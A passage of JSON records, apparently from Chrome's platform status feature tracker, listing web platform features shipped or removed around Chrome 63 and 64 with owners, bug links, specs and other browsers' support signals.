        "status": {
          "text": "Behind a flag",
          "val": 4,
          "milestone_str": 64
        },
        "owners": [
          "bengr@chromium.org",
          "tbansal@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 64,
        "blink_components": [
          "Blink>Network"
        ],
        "desktop": 64,
        "flag": true,
        "android": 64,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=772566",
        "intervention": false
      },
      "opera": {
        "android": 51,
        "desktop": 51
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "The saveData attribute is a boolean that indicates a client’s explicit opt-in for reduced data usage, due to high transfer costs, slow connection speeds, or other reasons. It's use allows JavaScript to make decisions that result in reduced data use, such as to load smaller images and video resources, or reduce buffering or predictive actions.\r\n\r\nThis is expected to be enabled by default in Chrome 65.",
    "id": 5076813940260864,
    "resources": {
      "samples": [
        "https://googlechrome.github.io/samples/network-information/"
      ]
    }
  },
  {
    "category": "Misc",
    "updated": {
      "when": "2017-11-21 16:15:57.664120",
      "by": "owencm@chromium.org"
    },
    "name": "Notifications to be displayed in the platform's Notification Center",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://notifications.spec.whatwg.org/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 64
        },
        "owners": [
          "peter@chromium.org",
          "miguelg@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "UI>Notifications"
        ],
        "desktop": 64,
        "flag": false,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=571056",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Strongly positive",
          "val": 1
        }
      }
    },
    "summary": "Most platforms ship with a notification center of their own - on mobile devices this may be more prominent than on desktops, but they do exist. We're in progress of moving notifications shown by Chrome to be included in those centers as well.\r\n\r\n- Android (shipped in Chrome 42)\r\n- Mac OS X (shipped in 59)\r\n- Linux (planned to ship in 64)\r\n- Windows (being prototyped)\r\n\r\nOther browsers already use native notification centers where available.",
    "id": 5689068222414848,
    "resources": {
      "samples": [
        "https://tests.peter.sh/notification-generator/"
      ]
    }
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2017-11-09 18:00:22.117610",
      "by": "eirage@chromium.org"
    },
    "name": "Prevent scrolling in HTMLElement.focus()",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://html.spec.whatwg.org/multipage/interaction.html#focus-management-apis",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://github.com/whatwg/html/issues/834#issuecomment-309267634",
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 64
        },
        "owners": [
          "eirage@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 64,
        "blink_components": [
          "Blink>Scroll"
        ],
        "desktop": 64,
        "flag": false,
        "android": 64,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=734166",
        "intervention": false
      },
      "opera": {
        "android": 51,
        "desktop": 51
      },
      "edge": {
        "view": {
          "url": "https://developer.microsoft.com/en-us/microsoft-edge/platform/issues/14314565/",
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "url": "https://bugs.webkit.org/show_bug.cgi?id=178583",
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Adds an optional argument to existing focus APIs that disable the scroll triggered by focus.",
    "id": 5745122025144320,
    "resources": {}
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2018-02-14 10:16:44.487160",
      "by": "hbos@chromium.org"
    },
    "name": "RTCRtpSender",
    "tags": [
      "WebRTC RTP Media API RTCRtpSender RTCPeerConnection RTCDtlsTransport RTCIceTransport getSenders addTrack removeTrack replaceTrack"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://w3c.github.io/webrtc-pc/#rtcrtpsender-interface",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://developer.microsoft.com/en-us/microsoft-edge/platform/catalog/?page=1&q=RTCRtpSender",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 64
        },
        "owners": [
          "hbos@chromium.org",
          "guidou@chromium.org",
          "deadbeef@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 64,
        "blink_components": [
          "Blink>WebRTC>PeerConnection"
        ],
        "desktop": 64,
        "flag": false,
        "android": 64,
        "bug": "https://crbug.com/700916",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "This feature tracks RTCPeerConnection methods getSenders(), addTrack(), removeTrack() and the essentials of interface RTCRtpSender.",
    "id": 5644723490390016,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/RTCPeerConnection",
        "https://developer.mozilla.org/en-US/docs/Web/API/RTCPeerConnection/addTrack",
        "https://developer.mozilla.org/en-US/docs/Web/API/RTCPeerConnection/getSenders",
        "https://developer.mozilla.org/en-US/docs/Web/API/RTCPeerConnection/removeTrack"
      ]
    }
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2017-11-15 18:44:27.000710",
      "by": "mathias@chromium.org"
    },
    "name": "RegExp named captures",
    "tags": [
      "regexp",
      "regular expressions"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://github.com/tc39/proposal-regexp-named-groups",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1362154",
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 64
        },
        "owners": [
          "jgruber@chromium.org",
          "littledan@chromium.org",
          "mathias@chromium.org",
          "yangguo@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 64,
        "blink_components": [
          "Blink>JavaScript>Language"
        ],
        "desktop": 64,
        "flag": false,
        "android": 64,
        "bug": "https://crbug.com/v8/5437",
        "intervention": false
      },
      "opera": {
        "android": 51,
        "desktop": 51
      },
      "edge": {
        "view": {
          "url": "https://github.com/Microsoft/ChakraCore/issues/3928",
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "url": "https://bugs.webkit.org/show_bug.cgi?id=176435",
          "text": "In development",
          "val": 2
        }
      },
      "webdev": {
        "view": {
          "text": "Strongly positive",
          "val": 1
        }
      }
    },
    "summary": "Named captures for ECMAScript regular expressions allow developers to create and refer to named capture groups.",
    "id": 5653365786673152,
    "resources": {
      "docs": [
        "https://developers.google.com/web/updates/2017/07/upcoming-regexp-features#named_captures"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-12-05 21:36:51.695520",
      "by": "ericbidelman@google.com"
    },
    "name": "Remove getMatchedCSSRules",
    "comments": "Intent to Deprecate: https://groups.google.com/a/chromium.org/forum/#!msg/blink-dev/fd-QLCiLESQ/_mfowSsRR8oJ\r\n\r\nIntent to Remove:\r\nhttps://groups.google.com/a/chromium.org/forum/#!topic/blink-dev/-_Al0I5Rm9Q\r\n\r\nUnofficial Blink polyfill (adapted from Gecko polyfill): https://gist.github.com/darrnshn/addeabe2575177342cc6242e20ecadbd",
    "standards": {
      "status": {
        "text": "No public standards discussion",
        "val": 6
      },
      "footprint": {
        "val": 2
      },
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=438278",
          "text": "Mixed public signals",
          "val": 4
        }
      },
      "chrome": {
        "status": {
          "text": "Removed",
          "val": 7,
          "milestone_str": 64
        },
        "owners": [
          "shend@chromium.org",
          "foolip@chromium.org",
          "meade@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 64,
        "blink_components": [
          "Blink>CSS"
        ],
        "desktop": 64,
        "flag": false,
        "android": 64,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=437569",
        "intervention": false
      },
      "opera": {
        "android": 51,
        "desktop": 51
      },
      "edge": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "url": "https://bugs.webkit.org/show_bug.cgi?id=79653",
          "text": "Mixed public signals",
          "val": 4
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "getMatchedCSSRules is a webkit-only API to get a list of all the style rules applied to a particular element. \r\n\r\nIt has been deprecated since 2014.",
    "id": 4606972603138048,
    "resources": {}
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2017-12-14 01:44:59.983130",
      "by": "ericbidelman@google.com"
    },
    "name": "Resize Observer",
    "tags": [
      "resizeobserver",
      "resize"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://wicg.github.io/ResizeObserver/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1272409",
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 64
        },
        "owners": [
          "atotic@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 64,
        "blink_components": [
          "Blink>Layout"
        ],
        "desktop": 64,
        "flag": false,
        "android": 64,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=612962",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "url": "https://developer.microsoft.com/en-us/microsoft-edge/platform/status/resizeobserver/",
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "url": "https://bugs.webkit.org/show_bug.cgi?id=157743",
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "The Resize Observer API can be used to observe changes to size of Element's content rect.",
    "id": 5705346022637568,
    "resources": {
      "docs": [
        "https://developers.google.com/web/updates/2016/10/resizeobserver"
      ],
      "samples": [
        "https://ebidel.github.io/demos/dom_resize_events.html",
        "https://jsfiddle.net/atotic/mr47wt1a/"
      ]
    }
  },
  {
    "category": "Misc",
    "updated": {
      "when": "2017-11-20 16:13:35.116780",
      "by": "csharrison@chromium.org"
    },
    "name": "Stronger popup blocker on sites with abusive experiences",
    "comments": "",
    "standards": {
      "status": {
        "text": "No public standards discussion",
        "val": 6
      },
      "footprint": {
        "val": 3
      },
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 64
        },
        "owners": [
          "csharrison@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "UI>Browser"
        ],
        "desktop": 64,
        "flag": false,
        "android": 64,
        "bug": "http://crbug.com/756089",
        "intervention": false
      },
      "opera": {
        "android": 51,
        "desktop": 51
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "On sites with very abusive experiences (see documentation link below), Chrome will start enforcing a more aggressive popup blocker. This will invoke Chrome's popup blocking UI for new windows or tabs regardless of whether there is a user gesture.",
    "id": 5243055179300864,
    "resources": {
      "docs": [
        "https://support.google.com/webtools/answer/7347327"
      ]
    }
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2017-11-22 08:07:22.852860",
      "by": "fbeaufort@google.com"
    },
    "name": "Throw NotSupportedError when media playbackRate is unsupported",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://html.spec.whatwg.org/multipage/media.html#dom-media-playbackrate",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 64
        },
        "owners": [
          "apacible@chromium.org",
          "mlamouri@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>Media"
        ],
        "desktop": 64,
        "flag": false,
        "bug": "https://crbug.com/747082",
        "intervention": false
      },
      "opera": {
        "android": 51,
        "desktop": 51
      },
      "edge": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Throw a NotSupportedError DOM exception when a media element’s playbackRate is set to an unsupported value.",
    "id": 5750156230131712,
    "resources": {
      "samples": [
        "https://googlechrome.github.io/samples/media/playback-rate-exception"
      ]
    }
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2017-11-14 08:18:23.653690",
      "by": "mathias@chromium.org"
    },
    "name": "Unicode property escapes in regular expressions",
    "tags": [
      "regexp",
      "regular expressions",
      "unicode"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://github.com/tc39/proposal-regexp-unicode-property-escapes",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1361876",
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 64
        },
        "owners": [
          "yangguo@chromium.org",
          "mathias@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 64,
        "blink_components": [
          "Blink>JavaScript>Language"
        ],
        "desktop": 64,
        "flag": false,
        "android": 64,
        "bug": "https://bugs.chromium.org/p/v8/issues/detail?id=4743",
        "intervention": false
      },
      "opera": {
        "android": 51,
        "desktop": 51
      },
      "edge": {
        "view": {
          "url": "https://github.com/Microsoft/ChakraCore/issues/2969",
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "url": "https://developer.apple.com/safari/technology-preview/release-notes/#release-42",
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Strongly positive",
          "val": 1
        }
      }
    },
    "summary": "The Unicode Standard assigns various properties and property values to every symbol. For example, to get the set of symbols that are used exclusively in the Greek script, search the Unicode database for symbols whose Script property is set to Greek.\r\n\r\nUnicode property escapes are a new type of escape sequence available in regular expressions that have the `u` flag set. They enable querying the Unicode database for certain properties and values.\r\n\r\nE.g. `/\\p{Script=Greek}/u.test('π') === true`",
    "id": 6706900393525248,
    "resources": {
      "docs": [
        "https://mathiasbynens.be/notes/es-unicode-property-escapes",
        "https://developers.google.com/web/updates/2017/07/upcoming-regexp-features#unicode_property_escapes"
      ]
    }
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2017-11-01 01:41:08.325520",
      "by": "kouhei@chromium.org"
    },
    "name": "import.meta",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://github.com/tc39/proposal-import-meta",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 64
        },
        "owners": [
          "adamk@chromium.org",
          "gsathya@chromium.org",
          "hiroshige@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 64,
        "blink_components": [
          "Blink>JavaScript>Language"
        ],
        "desktop": 64,
        "flag": false,
        "android": 64,
        "bug": "https://bugs.chromium.org/p/v8/issues/detail?id=6693",
        "intervention": false
      },
      "opera": {
        "android": 51,
        "desktop": 51
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "url": "https://trac.webkit.org/changeset/222895/webkit",
          "text": "In development",
          "val": 2
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "The `import.meta` meta-property provides a host-defined object which exposes context-specific metadata to a JavaScript module (e.g. the enclosing module's URL or associated <script> element).",
    "id": 5637509807603712,
    "resources": {
      "docs": [
        "https://docs.google.com/document/d/1XUmaB3LfneOjjtTN_6GHsHfpvdL2EYKJAyfOCaEGars/edit?usp=sharing"
      ]
    }
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2018-06-05 20:48:58.899610",
      "by": "avi@google.com"
    },
    "name": "window.alert() will not activate parent page",
    "comments": "This shipped in Safari 9.1 and Firefox 44.",
    "standards": {
      "status": {
        "text": "De-facto standard",
        "val": 1
      },
      "footprint": {
        "val": 3
      },
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=332195",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Removed",
          "val": 7,
          "milestone_str": 64
        },
        "owners": [
          "avi@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>WindowDialog"
        ],
        "desktop": 64,
        "flag": false,
        "bug": "https://crbug.com/747117",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "If a document in a background tab calls window.alert() then the call to alert() will return immediately; the dialog will be shown to the user when they switch to the tab. A UI indicator will be set so the user is aware of the pending alert dialog. This removes the ability to use window.alert() to bring a tab to the front against the user’s will.",
    "id": 6477774290157568,
    "resources": {}
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2017-09-20 02:33:29.983930",
      "by": "adamk@chromium.org"
    },
    "first_of_milestone": true,
    "name": "Async Iteration / Async Generators",
    "tags": [
      "JavaScript",
      "es6",
      "esnext",
      "es7",
      "es8",
      "harmony",
      "async",
      "iteration",
      "await",
      "for-await-of",
      "generator",
      "asyncIterator"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://tc39.github.io/proposal-async-iteration/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://groups.google.com/forum/#!topic/mozilla.dev.platform/J1cSMVqwZAY",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 63
        },
        "owners": [
          "caitp@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 63,
        "blink_components": [
          "Blink>JavaScript>Language"
        ],
        "desktop": 63,
        "flag": false,
        "android": 63,
        "bug": "https://bugs.chromium.org/p/v8/issues/detail?id=5855",
        "intervention": false
      },
      "opera": {
        "android": 50,
        "desktop": 50
      },
      "edge": {
        "view": {
          "url": "https://github.com/Microsoft/ChakraCore/issues/2720",
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "url": "https://bugs.webkit.org/show_bug.cgi?id=166693",
          "text": "In development",
          "val": 2
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Async Generator functions and a new iteration protocol (used by for-await-of loops and yield* expressions), to streamline consumption or implementation of streaming data sources.",
    "id": 5727385018171392,
    "resources": {
      "docs": [
        "https://jakearchibald.com/2017/async-iterators-and-generators/",
        "http://2ality.com/2016/10/asynchronous-iteration.html",
        "https://ponyfoo.com/articles/javascript-asynchronous-iteration-proposal"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-10-17 17:37:50.985850",
      "by": "ericbidelman@google.com"
    },
    "name": "CSS 'q' length unit",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://drafts.csswg.org/css-values/#absolute-lengths",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 63
        },
        "owners": [
          "hs1217@samsung.com",
          "ericwilligers@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 63,
        "blink_components": [
          "Blink>CSS"
        ],
        "desktop": 63,
        "flag": false,
        "android": 63,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=421907",
        "intervention": false
      },
      "opera": {
        "android": 50,
        "desktop": 50
      },
      "edge": {
        "view": {
          "text": "Mixed public signals",
          "val": 4
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "support 'q' absolute length unit.\r\n1q is equivalent to 1/40th of 1cm.",
    "id": 5983903483428864,
    "resources": {
      "docs": [
        "http://thenewcode.com/1158/The-Q-Continuum-Using-q-Measurements-In-CSS",
        "http://tosche.net/2013/10/font-size-in-the-metric-system_e.html"
      ],
      "samples": [
        "http://w3c-test.org/html/semantics/embedded-content/the-img-element/sizes/parse-a-sizes-attribute.html"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-10-19 15:17:03.086270",
      "by": "kojii@chromium.org"
    },
    "name": "CSS font-variant-east-asian",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://drafts.csswg.org/css-fonts-3/#font-variant-east-asian-prop",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 63
        },
        "owners": [
          "kojii@chromium.org",
          "drott@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 63,
        "ios": 63,
        "blink_components": [
          "Blink>Fonts"
        ],
        "desktop": 63,
        "flag": false,
        "android": 63,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=755462",
        "intervention": false
      },
      "opera": {
        "android": 50,
        "desktop": 50
      },
      "edge": {
        "view": {
          "text": "Mixed public signals",
          "val": 4
        }
      },
      "safari": {
        "view": {
          "url": "https://webkit.org/blog/5735/css-font-features/",
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Add support for font-variant-east-asian and respective mapping for the font: shorthand and the font-variant: shorthand.",
    "id": 4965040604053504,
    "resources": {}
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-11-07 20:42:34.563750",
      "by": "ericbidelman@google.com"
    },
    "name": "CSS overscroll-behavior",
    "tags": [
      "css"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://wicg.github.io/overscroll-behavior/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=951793",
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 63
        },
        "owners": [
          "majidvp@chromium.org",
          "sunyunjia@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 63,
        "blink_components": [
          "Blink>CSS"
        ],
        "desktop": 63,
        "flag": false,
        "android": 63,
        "bug": "https://crbug.com/672921",
        "intervention": false
      },
      "opera": {
        "android": 50,
        "desktop": 50
      },
      "edge": {
        "view": {
          "url": "https://discourse.wicg.io/t/generic-scroll-chaining-prevention-mechanism-or-expand-standardize-ms-scroll-chaining/1811/5?u=majidvp",
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "CSS `overscroll-behavior` allows developers to decide the browser's behavior once a scroller has reached its full extent. The unused delta can be propagated to the parent causing scroll chaining, create a glow/bounce effect without chaining, or just get consumed silently. This would be a standardization of \"-ms-scroll-chaining\" with some modification.",
    "id": 5734614437986304,
    "resources": {
      "docs": [
        "https://github.com/w3c/csswg-drafts/issues/769"
      ],
      "samples": [
        "https://ebidel.github.io/demos/chatbox.html"
      ]
    }
  },
  {
    "category": "Device",
    "updated": {
      "when": "2018-01-03 23:03:01.607530",
      "by": "jmedley@google.com"
    },
    "name": "Device Memory JS API",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 63
        },
        "owners": [
          "panicker@chromium.org",
          "fmeawad@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 63,
        "blink_components": [
          "Blink>PerformanceAPIs"
        ],
        "desktop": 63,
        "flag": false,
        "android": 63,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=710702",
        "intervention": false
      },
      "opera": {
        "android": 50,
        "desktop": 50
      },
      "edge": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Strongly positive",
          "val": 1
        }
      }
    },
    "summary": "JS API to expose the device Memory to web applications.",
    "id": 5119701235531776,
    "resources": {
      "docs": [
        "https://github.com/w3c/device-memory#the-web-exposed-api",
        "https://developer.mozilla.org/en-US/docs/Web/API/Navigator/deviceMemory"
      ]
    }
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2017-10-05 02:10:49.249980",
      "by": "tkent@chromium.org"
    },
    "name": "EventTarget.addEventListener/removeEventListener throws a TypeError",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://dom.spec.whatwg.org/#interface-eventtarget",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 63
        },
        "owners": [
          "yukishiino@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 63,
        "blink_components": [
          "Blink>Bindings"
        ],
        "desktop": 63,
        "flag": false,
        "android": 63,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=712778",
        "intervention": false
      },
      "opera": {
        "android": 50,
        "desktop": 50
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "EventTarget.addEventListener/removeEventListener throws a TypeError when the second argument |callback| is neither of EventListener nor Null nor Undefined.\r\n\r\nHistorically Blink had not been reporting a TypeError for the second argument of EventTarget.{add,remove}EventListener, but reports a TypeError since M63.",
    "id": 5651928583241728,
    "resources": {}
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2017-09-15 09:51:36.744380",
      "by": "raphael.kubo.da.costa@intel.com"
    },
    "name": "HTMLAllCollection and HTMLCollection's named properties are no longer enumerable",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
